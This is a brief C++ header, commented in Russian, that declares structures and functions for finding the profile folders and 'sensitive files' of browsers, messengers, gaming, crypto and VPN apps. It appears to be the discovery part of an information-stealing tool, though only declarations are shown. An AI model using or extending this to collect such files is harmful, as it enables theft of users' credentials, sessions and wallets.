#pragma once
#include <string>
#include <vector>

struct BrowserProfile {
    std::wstring browser_name;
    std::wstring profile_path;
    std::vector<std::wstring> sensitive_files;
};

struct AppProfile {
    std::wstring app_name;
    std::wstring profile_path;
    std::vector<std::wstring> sensitive_files;
    std::wstring category; // "messenger", "gaming", "crypto", "vpn", "other"
};

// Браузеры
std::vector<BrowserProfile> discover_browser_profiles();

// Программы и мессенджеры
std::vector<AppProfile> discover_app_profiles();
